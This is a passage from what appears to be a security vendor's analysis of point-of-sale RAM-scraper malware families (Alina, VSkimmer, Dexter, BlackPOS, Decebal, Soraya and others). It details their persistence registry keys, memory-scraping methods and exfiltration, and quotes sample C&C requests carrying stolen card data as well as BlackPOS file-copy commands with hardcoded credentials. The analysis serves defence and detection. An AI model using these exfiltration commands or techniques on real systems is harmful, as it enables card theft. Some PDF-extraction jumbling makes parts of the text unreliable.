infectors**\n\n**Figure 9: Process blacklist and socially engineered filename list**\n\n\n-----\n\n**Figure 10: CreateToolhelp32Snapshot method flowchart**\n\n**Figure 11: Regexes used to match Tracks 1 and 2 credit card data**\n\n\n-----\n\n**Figure 12: Alina submits the scraped data to a remote server via HTTP POST**\n\n**Alina Files Analyzed**\n\n**SHA-1** **Trend Micro Detection Name**\n\n4e682b34c3e122e55d21f9a501b9f13afb7437a9 BKDR_ALINA.KER\n\n5563e4c2987eda056b3f74716c00d3014b9306bc BKDR_ALINA.NA\n\na368829bc400284f1803f4e5de5844ae4ccdedf1 BKDR_ALINA.OJ\n\naadb31534bd276fa2f3029e89e93140a48a5ce0d BKDR_ALINA.ON\n\n2e3e8a3454262016d1d453c702a0dc8b42e29d5f TROJ_INJECT.AWH\n\n#### VSkimmer\n\n|Alina Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|4e682b34c3e122e55d21f9a501b9f13afb7437a9|BKDR_ALINA.KER|\n|5563e4c2987eda056b3f74716c00d3014b9306bc|BKDR_ALINA.NA|\n|a368829bc400284f1803f4e5de5844ae4ccdedf1|BKDR_ALINA.OJ|\n|aadb31534bd276fa2f3029e89e93140a48a5ce0d|BKDR_ALINA.ON|\n|2e3e8a3454262016d1d453c702a0dc8b42e29d5f|TROJ_INJECT.AWH|\n\n\n-----\n\nThe VSkimmer tool has an easy-to-configure\nbuilder interface. The user-configured\nparameters are applied to a stub file that\ncomes bundled with the builder in order\nto generate a customized executable file.\nThe builder appends a section called “_\n_Xyl2k_” to the stub. The sample built was_\nconfigured with the remote server address,\n_www . myexampleserver . co . cc, and renamed_\nto java.exe.\n\nWhen first executed, the malware copies\nitself to the %APPDATA% directory using\nthe user-configured filename, java.exe.\nIt adds itself to an Auto Start runkey with\nthe user-configured name, PCI Compliant\n_SCard. It also adds itself to the firewall as_\nan authorized application via the following\nregistry keys:\n```\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\\n  Microsoft\\Windows\\CurrentVersion\\\n  Run\\PCI Compliant SCard value:\n  %APPDATA%\\java.exe\n  HKEY_LOCAL_MACHINE\\SYSTEM\\\n  ControlSet001\\Services\\\n  SharedAccess\\Parameters\\\n\n```\nFirewallPolicy\\StandardProfile\\\n```\n  AuthorizedApplications\\\n  List\\%APPDATA%\\java.exe\n\n```\nVSkimmer is now ready to scrape the\nprocess memory for Tracks 1 and 2 credit\ncard data. It inspects running processes\nusing the CreateToolhelp32Snapshot method\nthat PoS RAM scrapers commonly use.\n\nVSkimmer calls CreateToolhelp32Snapshot\nto take a snapshot of all of the currently\nrunning processes on the system as well\nas the heaps, modules, and threads that\nthey use. It then calls Process32First, which\nretrieves information about the first process\nencountered in the snapshot. It maintains a\nblacklist of processes (e.g., smss.exe, csrss.\n_exe, winlogon.exe, etc.) to skip because_\nfinding credit card data in the process\nmemory space of those processes is highly\n\n\nunlikely. If the current process is not in the\nblacklist, VSkimmer opens the process\nobject using OpenProcess and reads the\nmemory content via ReadProcessMemory.\nThe sample we analyzed only has the regex\nto match Track 2 credit card data hardcoded\nin its binary, however, other versions may\nhave regexes to match both Tracks 1 and 2\ncredit card data. The regex to match Track 2\ncredit card data runs on the process memory\ncontent that VSkimmer reads.\n\nWhen the regex matching on the process\nmemory is completed, VSkimmer retrieves\nthe next process recorded in the snapshot\nusing Process32Next and the inspection\ncycle is repeated. The malware implements\ntwo data-exfiltration methods. Online, it uses\nHTTP GET to exfiltrate the Tracks 1 and 2\ncredit card data that it scrapes and sends it\nto a user-configured C&C server address.\nMost PoS RAM scrapers use HTTP POST\nunlike VSkimmer, which uses HTTP GET.\nThe stolen card data is encoded as a Base64\nstring and is appended to the user-configured\nURL path, /api/process.php?xy=.\n\nThe following is a sample HTTP GET request\nto a C&C server:\n```\n  http://www.myexampleserver.co.cc/\n  api/process.php?xy=NDAwMDAwMDAwMDA\n\n  wMDAwMj0xNTA0MTAxMTAwMDA0ND##\n\n```\nVSkimmer also has manual data-exfiltration\nfunctionality. If infected systems are\noffline, it looks for a removable drive called\n_“KARTOXA007” (i.e., user-configurable drive_\nname) and dumps all of the credit card data it\nharvests in a file called “dmpz.log” (i.e., userconfigurable filename) on the drive. If a C&C\nserver cannot be reached and no removable\ndrives are connected to the infected systems,\nthe data is dumped in a text file called\n_“compliant.dat.”_\n\nVSkimmer also has bot functionality. It can\nreceive and parse the commands, upd and\n_dlx, from C&C servers. The upd command_\n\n\n_dlx, from C&C servers. The upd command_\n\n\n-----\n\ntells infected systems to send a status update\nto servers. The dlx command, meanwhile,\ntells infected systems to download and\nexecute a file passed as a parameter to\nthe command. Cybercriminals can use\nthe dlx command to update the bot or to\ndownload other malicious software onto\nalready-infected systems. The VSkimmer\nbuilder package comes with a server-side\nbot management portal. VSkimmer’s bot\nmanagement portal accesses and populates\na SQL database through the Web interface.\nThe database has three tables—cmdresults,\n_commands, and terminals. The top-level_\n\n\ntable—terminals—tracks infected systems’\nlocations, volume, status, bot version\nnumber, users, OSs, and others. The\n_cmdresults table tracks bots’ status, while_\nthe commands table tracks tasks assigned to\nbots.\n\nWYSIWYG builders such as VSkimmer\nhave industrialized PoS-RAM-scraper\ngeneration, making the malware mainstream\nand opening up more possibilities for data\nbreaches.\n\n\n**Figure 14: Appended section called “_Xyl2k_”**\n\n\n-----\n\n**Figure 15: CreateToolhelp32Snapshot method code flow**\n\n\n-----\n\n**Figure 16: VSkimmer reads the process memory and searches for Track 2 credit card data**\n\n**Figure 17: VSkimmer encodes stolen data as a Base64 string and appends it to a user-configured URL**\n\npath\n\n\n-----\n\n**Figure 18: VSkimmer’s database schema**\n\n|VSkimmer Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|8b7e8d5ddd0c3ac657d358df7f70090204efb9e1|TROJ_HESETOX.D|\n|fc7528e8dced7d70d92923b645c51885ac652e1e|TSPY_POCARDL.DAM|\n|d541441ed4d475e79e95c8c7f550a24922c3ffdb|BKDR_HESETOX.SMJ|\n|31dad731919e20c0cb3ce98efc01daea4ac34f21|TSPY_POCARDL.AK|\n\n\n-----\n\n#### Dexter\n\nDexter variants, first discovered in\nDecember 2012, steal more than just\nTracks 1 and 2 credit card data from infected\nsystems. They also steal system information\nand install a keylogger. [23]\n\nWhen first executed, Dexter follows an\nelaborate installation process. The sample\nanalyzed executed the following actions:\n\n   - Starts an Internet Explorer® process\n(i.e., iexplore.exe) in the background\n\n   - Injects itself into the spawned\n_iexplore.exe process_\n\n   - Copies itself to %APPDATA%\\Java\n_Security Plugin\\javaplugin.exe_\n\n   - Adds the following Auto Start runkeys:\n```\n  HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Run\\Sun Java\n  Security Value: %APPDATA%\\Java\n  Security Plugin\\javaplugin.exe\n  HKCU\\.DEFAULT\\Software\\Microsoft\\\n  Windows\\CurrentVersion\\Run\\Sun\n  Java Security Value: %APPDATA%\\\n  Java Security Plugin\\javaplugin.\n  exe\n  HKCU\\Software\\Microsoft\\Windows\\\n  CurrentVersion\\Run\\Sun Java\n  Security Value: %APPDATA%\\Java\n  Security Plugin\\javaplugin.exe\n\n```\n   - Modifies the following\n_LowRiskFileTypes registry key:_\n```\n  HKCU\\Software\\Microsoft\\Windows\\\n  CurrentVersion\\Policies\\\n  Associations\\LowRiskFileTypes\n  value: .exe;.bat;.reg;.vbs;\n\n```\n   - Modifies Internet Setting Zones\nto blanket-permit all policies for\n\n\nthe Local Machine Zone using the\nfollowing registry keys:\n```\n  HKCU\\Software\\Microsoft\\Windows\\\n  CurrentVersion\\Internet Settings\\\n  Zones\\0\\1806 value: 0\n  HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Internet Settings\\\n  Zones\\0\\1806 value: 0\n\n```\n   - Drops a keylogger component in\n_%WorkingDir%\\SecureDll.dll_\n\nDexter then scrapes the process memory\nfor Tracks 1 and 2 credit card data.\nIt inspects running processes via the\n_CreateToolhelp32Snapshot method that PoS_\nRAM scrapers commonly use.\n\nDexter calls CreateToolhelp32Snapshot\nto take a snapshot of all of the running\nprocesses on the system as well as the\nheaps, modules, and threads that they\nuse. It then calls Process32First, which\nretrieves information about the first process\nencountered in the snapshot. It also\nmaintains a blacklist of processes (e.g.,\n_iexplore.exe, smss.exe, winlogon.exe, etc.)_\nto skip because finding credit card data in\nthe memory of these processes is highly\nunlikely. If a process is not in the blacklist,\nDexter opens the process object using\n_OpenProcess and reads the memory content_\nvia ReadProcessMemory.\n\nDexter uses a different method to search\nfor Tracks 1 and 2 credit card data in the\nprocess memory compared with other PoS\nRAM scrapers. Instead of using regex\nmatches, it uses a custom search function\nthat looks for identifier bytes, followed by\nthe correct number of digits. It searches the\nread process memory in 64k-sized chunks.\nPerforming a custom search is faster than\nregex matching but can result in collecting\ngarbage data in addition to actual\nTracks 1 and 2 credit card data. Dexter’s goal\nis to be efficient rather than to collect quality\n\n\nto blanket-permit all policies for is to be efficient rather than to collect quality\n\n\n-----\n\ninformation and exfiltrated data is validated\noffline.\n\nIn addition to Tracks 1 and 2 credit card\ndata, Dexter also collects system information\nand logs keystrokes. It installs a keylogger\ncomponent, SecureDll.dll, in the current\n_%WorkingDir%. It enables the hidden file_\nattribute on SecureDll.dll so it will not be\nvisible in Windows® Explorer. SecureDll.dll\nexports the following functions:\n\n_•_ _KeyloggerDll_1_\n\n_•_ _KeyloggerDll_2_\n\n_KeyloggerDll_* functions call the_\n_GetKeyboardState API, which returns the_\nstatus of the 256 virtual keys to a specified\nbuffer. Dexter calls LoadLibrary to load the\nfunctions that SecureDll.dll exports and\ncalls SetWindowsHookEx to hook handlers,\n_WH_KEYBOARD (i.e., monitor keyboard_\ninput) and WH_GETMESSAGE (i.e., monitor\nmouse and keyboard input). These allow\nDexter to intercept all of the keystrokes made\non infected systems.\n\nDexter uses HTTP POST to exfiltrate data\nand send it to a C&C server whose address\n\n\nis hardcoded in its binary. It has a constructor\nfunction that fills in preassigned variables\nwith exfiltrated data. The data is encoded as\na Base64 string and sent out as an HTTP\nPOST request.\n\nThe following is a sample HTTP POST\nrequest that Dexter sends:\n```\n  Connection: 63.165.250.100:80\n  Content: POST/w1921831741862103104\n\n  1543/gateway.php HTTP/1.1\\r\\\n  nContent-Type: application/x-www  form-urlencoded\\r\\nUser-Agent:\n  Mozilla/4.0[compatible; MSIE 7.0b;\n  Windows NT 6.0]\\r\\nHost: www.w1n4.\n  com\\r\\nContent-Length: 173\\r\\\n  nCache-Control: no-cache\\r\\n\\r\\=\n  WltXUFZbAFdOVFVTUk5XWgdXTgIFUlpO\n  AAZWUQEHVQVWBVoG&unm=IgcOCg0KEBc\n  RAhcMEQ==&cnm=BwBOBQoPBhARFQ==&\n  query=NAoNBwwUEEM7Mw==&spec=UFF\n  DIQoX&opt=Ww&var=MBcCEScWEBc=&val=\n\n  c3ltY2c=\n\n```\nThe following table shows the variables that\nDexter uses in HTTP POST requests. [24], [25]\n\n|HTTP POST Parameters That Dexter Uses|Col2|\n|---|---|\n|Variable|Value|\n|page|Mutex|\n|ump|Track data|\n|ks|Keylogger|\n|opt|Unknown|\n|unm|Username|\n\n\n-----\n\n|HTTP POST Parameters That Dexter Uses|Col2|\n|---|---|\n|Variable|Value|\n|cnm|Hostname|\n|view|Running processes|\n|spec|Architecture|\n|query|OS|\n|val|Base64 XOR key|\n|var|Dexter identifier|\n\n\nDexter also has bot functionality. The\nfollowing table shows the bot commands that\n\n**Command**\n\ndownload\nupdate\ncheckin\nscanin:\n\nuninstall\n\nDexter is one of the most potent PoS RAM\nscraper families because its data-theft\nactivities are not limited to only stealing credit\ncard data. It also steals system information\nand installs a keylogger on infected systems.\n\n\nDexter can process.\n\n**Description**\n\nDownloads and executes <parameter>\n\nUpdates the malware\n\nChanges the time intervals between data\nsubmissions\n\nChanges the time intervals between memory scans\n\nServes as a kill switch; uninstalls the malware\n\nThis is very dangerous in a corporate\nenvironment because it can steal sensitive\ncorporate information entered into PoS\nsystems. [26]\n\n|Bot Commands That Dexter Can Process|Col2|\n|---|---|\n|Command|Description|\n|download-|Downloads and executes <parameter>|\n|update-|Updates the malware|\n|checkin-|Changes the time intervals between data submissions|\n|scanin:|Changes the time intervals between memory scans|\n|uninstall|Serves as a kill switch; uninstalls the malware|\n\n\n-----\n\n**Figure 19: Dexter captures running processes using the CreateToolhelp32Snapshot method and checks**\n\na blacklist for processes to skip\n\n**Figure 20: Dexter ignores blacklisted processes**\n\n**Figure 21: Custom search function that Dexter applies to 64k-sized chunks of memory**\n\n\n-----\n\n**Figure 22: Custom search function that Dexter uses to look for identifier bytes**\n\n**Figure 23: KeyloggerDll_1—one of the functions that SecureDll.dll exports**\n\n\n-----\n\n|Dexter Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|f07f40f0b17a4d282e1c55b3a23b331b1f78c4d0||\n|a8bb7ce5e8616241a268666cd07926938dfbbe44||\n|32ed9f0beae53f1928bf5727111efbf81df9ac96|TSPY_DEXTER.CA|\n|408d63a01e8e111181db921f1bf603e1a76622cf|TROJ_PINCAV.TF|\n\n\n#### BlackPOS\n\nBlackPOS is probably the most well-known\nPoS RAM scraper due to its role in the\nmassive breach targeting one of the biggest\nU.S. retailers between 27 November and\n15 December in 2013. [27] A BlackPOS\nvariant was used to steal the payment card\ndata of 70 million customers across the\ncountry. [28] Selling the stolen card and\nother customer data is expected to generate\nan income of US$53.7 million for the\ncybercriminals. [29], [30] BlackPOS is actually\nan old malware, first discovered around\nthe middle of 2012. Its source code was\nleaked online at some point, which led to the\ncreation of several BlackPOS variants with\ndifferent functionality. [31]\n\nBlackPOS enumerates all of the processes\nrunning on the infected system using the\n_EnumProcesses method and scans the_\nprocess memory for Tracks 1 and 2 credit\ncard data.\n\nBlackPOS calls EnumProcesses, which\npopulates an array with a list of process\nidentifiers. It iterates over this array. For each\narray element, it calls OpenProcess to get\nthe process handle then calls VirtualQueryEx\nto retrieve information about a range of\npages within the virtual address space of the\n\n\nprocess. It reads the process memory using\n_ReadProcessMemory._\n\n**Figure 24: BlackPOS’s custom search function**\n\nBlackPOS searches the process memory\nusing one of two methods. In the first\nmethod, it uses a custom search function\nthat searches the full process memory for\nidentifier bytes, followed by the correct\nnumber of digits, and writes the data that\nit scrapes to a file on disk. In the second\nmethod, it applies the custom search\nfunction to only x bytes of process memory\nat a time. It repeats this search until the\nentire memory space of the process is\ninspected. This custom search function is\nfaster than matching regexes but can lead\nto the collection of garbage data in addition\nto the actual Tracks 1 and 2 credit card\n\n\n-----\n\ndata. Similar to Dexter, BlackPOS’s goal is\nto be efficient rather than to collect quality\ninformation and exfiltrated data is validated\noffline.\n\nThe original BlackPOS malware is a simple\ncommand line tool that supports user-defined\nsearch patterns. This makes BlackPOS a\nflexible tool that can search for all kinds of\npattern in the process memory space without\nrequiring code modification.\n\nThe credit card data found in the process\nmemory can be seen on a command window\nor written to a file on disk. The sample we\nanalyzed dumps the data in a file called\n_“output.txt.”_\n\n**Figure 25: Sample credit card data that**\n\nBlackPOS finds\n\nWriting search results to a file on disk is\ncommon across all of the BlackPOS variants\nanalyzed. This allows cybercriminals to\nexfiltrate the stolen data in various ways. The\nfollowing are some of the exfiltration methods\ndiscovered:\n\n**•** **Exfiltration via email: The**\nexecutable file, 1.exe, is a command\nline email client. 2.exe is the\nBlackPOS RAM scraper that is\nexecuted in an infinite loop in the\nbatch script. The output.txt file is\nthen emailed to an icloud.com email\naddress from a gmail.com email\naddress. The email has Transport\nLayer Security (TLS) enabled in order\nto encrypt the message’s content. The\nemail uses “Resultz” as subject. The\n\n\nmessage body, meanwhile, uses the\ngreeting, “Hi Buddy.”\n\n**•** **Exfiltration via direct FTP**\n**upload: This can be done without**\naffected users’ knowledge. The\nFTP credentials, hardcoded in the\nBlackPOS binary, are used to log in\nto a remote FTP server and to upload\nthe text file with the stolen credit card\ndata.\n\n**•** **Exfiltration via file copy to a remote**\n**server: The BlackPOS variant**\nused in the Target credit card data\nbreach dropped the stolen data in\na text file called “winxml.dll” in the\n_%WINDIR%\\<system32> directory._\nThere is a seven-hour sleep cycle\nafter which the malware copies the\ndata that it collects to a compromised\ndump server on the same network\nusing the following system\ncommands:\n```\n  %windir%\\system32\\cmd.exe/cnet\n  use S:\\\\10.116.240.31\\c$\\WINDOWS\\\n  twain_32/user:ttcopscli3acs\\Best1_\n  user BackupU$r\n  %windir%\\system32\\cmd.exe/c move\n  C:\\WINDOWS\\system32\\winxml.dll\n\n```\nS:\\<filename>.txt\n```\n  %windir%\\system32\\cmd.exe/c S:/del\n\n```\nAn uploader running on the\ncompromised dump server uploads\nthe stolen data to a remote FTP\nserver. This can be detected by IT\nadministrators who monitor FTP\ntraffic.\n\nBlackPOS is a simple PoS RAM scraper that\nhas been successfully used in numerous\ndata breach attacks. Its leaked source\ncode allows cybercriminals to easily add\nfunctionality to the base malware. Support\n\n\n-----\n\nfor custom patterns to search the process\nmemory means that BlackPOS can steal a\nwide range of data. The results are always\nwritten to a text file that can be exfiltrated\nusing the method above, among others. All\n\n\nof BlackPOS’s features make it a successful\ndata breach tool. Its success, unfortunately,\nmeans that it will further evolve and be used\nin more data breach attacks in the future.\n\n\nMETHOD 1 METHOD 2\n\nEnumProcessesOpenProcess EnumProcesses\n\nAProcesses[I] AProcesses[I]\n\nOpenProcess OpenProcess\n\nReadProcessMemory ReadProcessMemory\n\nCustom_Search_Func Use X bytes\n\nWrite_Data_To_File Custom_Search_Func\n\nYes Write_Data_To_File\n\nSearched_all_\nMemory?\n\n**Figure 26: EnumProcesses method flowchart**\n\n\n-----\n\n**Figure 27: BlackPOS’s command line options**\n\n**Figure 28: BlackPOS can exfiltrate data via email**\n\n**Figure 29: BlackPOS can exfiltrate data via FTP upload**\n\n\n-----\n\n**Figure 30: BlackPOS can copy a data file to a compromised dump server that resides on the same**\n\nnetwork\n\n|BlackPOS Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|e9239277190ea33470738ddf3aa48a0a41c4753b||\n|b20d49115653946ae689d0d572fdfc483ea04cc5||\n|8a6af8587adf0e743871ad6b9889428b5f75b86b|TSPY_POCARDL.AB|\n|71983a80541ec714d59fb91575f6bfd4fcdda8b1|TSPY_POCARDL.U|\n\n\n-----\n\n#### Decebal\n\nDecebal refers to a PoS RAM scraper\nmalware family first discovered at the\nbeginning of 2014. [32] Decebal is unique in\nthat it is coded in VBScript and is compiled\ninto an executable file. Most PoS RAM\nscrapers are coded in C, C++, or Delphi. Like\nBlackPOS, Decebal’s source code was also\nleaked online. Decebal comes with many\nexisting functionality found in established\nand even new PoS RAM scraper malware\nfamilies.\n\nOn startup, Decebal checks for installed\nsandboxing and reverse-engineering tools on\ninfected systems to evade detection. If any is\ndiscovered, it will terminate its process.\n\nAfter determining the nonexistence of\nsandboxing or debugging tools, Decebal\ninstalls itself in %USERPROFILE% as\n_iexplorer.exe. It then audits infected systems_\nin order to determine their OS, computer\nname, and username.\n\nDecebal also retrieves the name of any\nanti-malware solution installed on infected\nsystems. This information is exfiltrated to a\nremote server, along with the stolen Tracks 1\nand 2 credit card data.\n\nDecebal inspects all of the running\nprocesses using a slightly modified version\nof the CreateToolhelp32Snapshot method\nthat PoS RAM scrapers commonly use. It\ncalls CreateToolhelp32Snapshot to take a\nsnapshot of all of the running processes\non infected systems, along with the heaps,\nmodules, and threads that they use. It then\ncalls Process32Next inside a do-while\nloop. [33] Decebal maintains a blacklist of\nprocesses (e.g., svchost.exe, csrss.exe,\n_wininit.exe, etc.) to skip because finding_\ncredit card data in the memory of these\nprocesses is highly unlikely. If a current\nprocess being inspected is not in the\nblacklist, it opens the process object using\n\n\n_OpenProcess and reads the memory content_\nvia ReadProcessMemory. Regexes to match\nTracks 1 and 2 credit card data are run on\nthe process memory content that Decebal\nreads. The sample analyzed only has a regex\nto match Track 2 credit card data although its\nsource code can be easily modified to match\nboth Tracks 1 and 2 data.\n\nDecebal has a built-in Luhn-validation\nmechanism. The results returned by regex\nmatching are validated to make sure that the\nTrack data that it scrapes from the process\nmemory contains valid credit card numbers.\n\nDecebal exfiltrates stolen data by making\nconnection requests to a remote server via\n_InternetOpenUrl. The data is exfiltrated in_\nthe HTTP header that is sent to the remote\nserver. The SendPHP() subroutine constructs\na special URL that contains hexadecimalencoded values for the following information:\n\n**_•_** **_&co: Computer name_**\n\n**_•_** **_&us: Username_**\n\n**_•_** **_&av: Installed anti-malware solution_**\nname\n\n**_•_** **_&os: OS_**\n\n**_•_** **_&tr2: Track 2 credit card data_**\n\nThe remote server runs a simple PHP script\nto monitor incoming connection requests.\n\nThe servers strip out the variables from the\nHTTP headers that it receives and converts\nthe hexadecimal-encoded values into strings\nand writes them to a text file.\n\nDecebal infects systems via drive-bydownload attacks or by luring potential\nvictims to compromised websites. It can also\nbe dropped by other malware. The leaked\nsource code means that, like BlackPOS,\nit can be easily modified to add new\nfunctionality for use in data breach attacks.\n\n\n-----\n\n**Figure 31: Decebal checks for the presence of debugging tools**\n\n**Figure 32: Decebal audits infected systems**\n\n**Figure 33: Decebal checks for anti-malware solutions**\n\n**Figure 34: Decebal uses the CreateToolhelp32Snapshot method to search for Track 2 credit card data**\n\n\n-----\n\n**Figure 35: Decebal’s built-in Luhn-validation mechanism**\n\n**Figure 36: Decebal uses HTTP headers to exfiltrate stolen data**\n\n\n-----\n\n**Figure 37: Decebal’s server-side code**\n\n|Decebal Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|1f3d59d4e537911f7719e2b5f55723a7e7bfae88||\n|8d8dca6aed3d6688910a3bbedd1ce562e45d9ac4||\n|42e55bfad0677cc810cfb08a4cf4cf668725b3c8||\n\n\n-----\n\n## NEXT-GENERATION PoS RAM SCRAPERS\n\n\nPoS RAM scraper attacks are still prevalent,\nas evidenced by all of the new malware\nfamilies that are constantly being discovered.\nRecently discovered families show that the\nnext generation of PoS RAM scrapers are\nextensively reusing ideas and functionality\nseen in already-existing families, along with\nnew feature additions.\n\n#### JackPOS\n\nJackPOS is an Alina-inspired PoS RAM\nscraper family first discovered at the\nbeginning of 2014. [34], [35] It does not\nshare a code base with Alina but heavily\nborrows ideas and functionality from the\nlatter. When first executed, JackPOS installs\nitself on the %APPDATA% directory. Like\nAlina, JackPOS maintains a list of socially\nengineered filenames, all related to Java™,\nand installs itself using a filename from\nthe said list. It also adds itself to an Auto\nStart runkey to maintain persistence. It also\ndrops a watchdog program in %TEMP%.\n\n\nThis watchdog ensures that the JackPOS\nprocess is always running. If the process is\nnot running or is terminated, the watchdog\nspawns a new JackPOS process.\n\nJackPOS uses the\n_CreateToolhelp32Snapshot method to_\ninspect all running processes for Tracks 1\nand 2 credit card data. Like Alina, it maintains\na blacklist of processes to skip. Instead of\nusing regex matching, JackPOS uses a\ncustom search function to look for identifier\nbytes, followed by the correct number of\ndigits, in order to find Tracks 1 and 2 credit\ncard data in the process memory. It exfiltrates\nthe stolen data using HTTP POST and\nBase64-encodes the content. It also sends\ninfected systems’ MAC addresses to C&C\nservers, possibly using them as identifiers. It\nalso has a bot functionality and can process\ncommands such as the following:\n\n**_•_** **_update: Update itself_**\n\n**_•_** **_kill: Remove itself (kill switch)_**\n\n|JackPOS Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|9d78ff3123e485eda287aed83c1c2dc9d3de02d5||\n|a6916594f407c1d2cc794146d90062fc8e6dcd98||\n|2f3d2d6a28a2532267f8f6affd8e70d203f0d00d||\n|9c0117a66cf460bdb0cc211a4f13a170cc88b4f7||\n|5cad762578ba264f677d83b8ecd84158b264f9ef||\n\n\n-----\n\n#### Soraya\n\nSoraya is a Dexter-and-ZeuS-inspired\nPoS RAM scraper variant first discovered\nin June 2014. [36] It is custom-packed to\nobfuscate its code and to make it difficult for\nsecurity researchers to reverse-engineer its\nbinary. When first executed, Soraya injects\nits code into several running processes.\nIt borrowed tricks from ZeuS and hooks\nthe NtResumeThread API, which is called\nby Windows to execute new processes. It\nthen injects its code into all newly created\nprocesses. It also copies itself to the\n_%APPDATA% directory and adds itself to an_\nAuto Start runkey to remain persistent.\n\nSoraya iterates over all running processes\nusing the same method that Dexter does.\nIt maintains a blacklist of processes to skip\nwhen scanning. Instead of using regex\nmatching, it uses a custom search function\nto look for identifier bytes, followed by the\ncorrect number of digits, to find Tracks 1 and\n2 credit card data in the process memory. It\n\n**SHA-1**\n\n0BE287EEFE96EE1519A37A0F6C6A547EF043E80E\n\nE70F9BADB8C97296B11732B63B4E512640249712\n\n#### ChewBacca\n\nChewBacca is a PoS RAM scraper family,\nfirst discovered at the end of 2013, which\nuses the Tor network to exfiltrate stolen data.\n\n[37], [38] When first executed, ChewBacca\ncopies itself to %USERPROFILE%\\START\n_MENU\\Programs\\Startup\\spoolsv.exe_\nand adds itself to an Auto Start runkey to\nremain persistent. It is self-contained and\ninstalls obfsproxy v0.2.3.25—a Tor proxy\n\n\nalso has a built-in Luhn-validation method.\nThe search results are validated to ensure\nthat the Tracks 1 and 2 credit card data that\nit scrapes from the process memory contains\nvalid credit card numbers.\n\nSoraya also borrowed ZeuS’s form-grabbing\nfunctionality. After injecting itself into a\nprocess, Soraya checks if the process is\nfor Web browsing. If it is, Soraya hooks the\nbrowser’s function responsible for sending\nHTTP POST requests. It can hook the HTTP\nPOST function in Internet Explorer, Firefox,\nand Chrome. All of the POST data the\nbrowsers send is captured. Form grabbing\nallows Soraya to steal victims’ credentials\nand other confidential information used in\nonline banking. It exfiltrates the following to\nC&C servers via HTTP POST:\n\n   - System information\n\n   - Tracks 1 and 2 credit card data\n\n   - Raw POST data\n\n**Trend Micro Detection Name**\n\nTSPY_SORAYA.A\n\napplication—in %TEMP%. It then hooks WH_\n_KEYBOARD_LL, which monitors keyboard_\ninput events. This allows ChewBacca to\ncapture all keyboard events, which are then\nlogged to %TEMP%\\system.log. [39]\n\nChewBacca uses the\n_CreateToolhelp32Snapshot method to_\ninspect all running processes for\nTracks 1 and 2 credit card data. Instead\nof regex matching, it uses a custom\nsearch function that looks for identifier\n\n|Soraya Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|0BE287EEFE96EE1519A37A0F6C6A547EF043E80E||\n|E70F9BADB8C97296B11732B63B4E512640249712||\n\n\ninstalls obfsproxy v0.2.3.25—a Tor proxy\n\nsearch function that looks for identifier\n\n\n-----\n\nbytes, followed by the correct number\nof digits, in order to find Tracks 1 and 2\ncredit card data in the process memory.\nIt then retrieves victims’ IP addresses\nby visiting http :// ekiga . net / ip / and then\nestablishes a Tor circuit for anonymity. Tor\nconceals C&C servers’ IP addresses and\n\n**SHA-1**\n\n0392F25130CE88FDEE482B771E38A3EAAE90F3E2\n\n#### BrutPOS\n\nBrutPOS, first discovered in July 2014,\nappears to have borrowed ideas and\nfunctionality from BlackPOS and Rdasrv.\n\n[40] It is custom-packed to obfuscate its\ncode and to make it difficult for security\nresearchers to reverse-engineer its binary.\nIt attempts to exploit PoS systems that use\nweak or default passwords with open Remote\nDesktop Protocol (RDP) ports. [41] Note that\nusing weak or default passwords means\nnoncompliance to mandatory PCI DSS\nrequirements for merchants that process\ncredit card transactions. BlackPOS carried\nout RDP password brute-forcing attacks back\nin 2013. BrutPOS has adopted this attack\nstrategy to infiltrate systems.\n\nLike Rdasrv, BrutPOS targets known PoS\nsystem software (e.g., MICROS RES).\n\n\nencrypts all traffic by default. The sample\nanalyzed accessed the C&C server,\n_http :// 5ji235jysrvwfgmb . onion /, which uses a_\n_.onion pseudo-top-level domain (TLD). Note_\nthat a .onion TLD cannot be resolved outside\nthe Tor network and can only be accessed by\nusing a Tor proxy application.\n\n**Trend Micro Detection Name**\n\nTSPY_FYSNA.A\n\nBrutPOS scans and attacks specified IP\nranges, which implies that the cybercriminals\nbehind it select targets instead of launch\nattacks at random. It has been known to\ntarget U.S. companies in the food services\nindustry. Like other PoS RAM scrapers,\nBrutPOS also has the following features:\n\n   - Multiple components\n\n   - Process exclusion list\n\n   - Custom search function\n\n   - Luhn validation\n\n   - Bot functionality\n\n   - Exfiltration of stolen Tracks 1 and 2\ncredit card data via FTP\n\n|ChewBacca Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|0392F25130CE88FDEE482B771E38A3EAAE90F3E2|TSPY_FYSNA.A|\n\n|BrutPOS Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|fb357bb5d9c2de75afa69bfec8c22041b02e03df|TROJ_TIBRUN.B|\n\n\n-----\n\n|BrutPOS Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|2cf34b70906779c9e230c5ffce4179f4f58eea5a||\n|11b7430026c82097657c145dcedfa818bf1032d3||\n\n\n#### Backoff\n\nBackoff is also an Alina-inspired family of\nPoS RAM scrapers discovered in July 2014.\n\n[42], [43] It is custom-packed to obfuscate\nits code and to make it difficult for security\nresearchers to reverse-engineer its binary.\nWhen first executed, it copies itself to\n_%APPDATA%\\ORACLEJAVA\\javaw.exe._\nIt then launches the copy in %APPDATA%\nusing the -m <path_to_original_Backoff>\nparameter. This terminates the original\nBackoff process and deletes the associated\nfile on infected systems’ disk. We have seen\nAlina use this installation technique. Backoff\nalso adds itself to an Auto Start runkey to\nremain persistent. It injects a watchdog stub\ninto explorer.exe to ensure that its process\nconstantly runs. If the Backoff process is not\nrunning or terminated, the watchdog stub\ndecrypts and reinstalls a stored copy of the\nmalware.\n\nBackoff uses the CreateToolhelp32Snapshot\nmethod to inspect all running processes for\nTracks 1 and 2 credit card data. Like Alina,\nit also maintains a blacklist of processes to\nskip when scanning. And instead of regex\nmatching, it uses a custom search function\nto look for identifier bytes, followed by 